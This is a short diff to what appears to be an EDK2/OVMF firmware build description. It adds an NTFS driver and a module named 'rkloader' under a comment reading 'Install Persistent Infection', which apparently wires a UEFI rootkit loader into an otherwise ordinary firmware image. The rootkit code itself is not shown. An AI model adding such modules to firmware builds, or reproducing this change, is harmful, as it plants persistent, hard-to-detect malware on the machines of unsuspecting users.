@@ -126,6 +126,7 @@
   TpmMeasurementLib|SecurityPkg/Library/DxeTpmMeasurementLib/DxeTpmMeasurementLib.inf
 !endif
 
+  
   S3BootScriptLib|MdeModulePkg/Library/PiDxeS3BootScriptLib/DxeS3BootScriptLib.inf
   SmbusLib|MdePkg/Library/BaseSmbusLibNull/BaseSmbusLibNull.inf
 
@@ -558,6 +559,8 @@
   OvmfPkg/SecureBootConfigDxe/SecureBootConfigDxe.inf
 !endif
 
+  NtfsPkg/NtfsDxe/Ntfs.inf
+  rkloader/rkloader.inf
 #
 #  Install Persistent Infection
 #
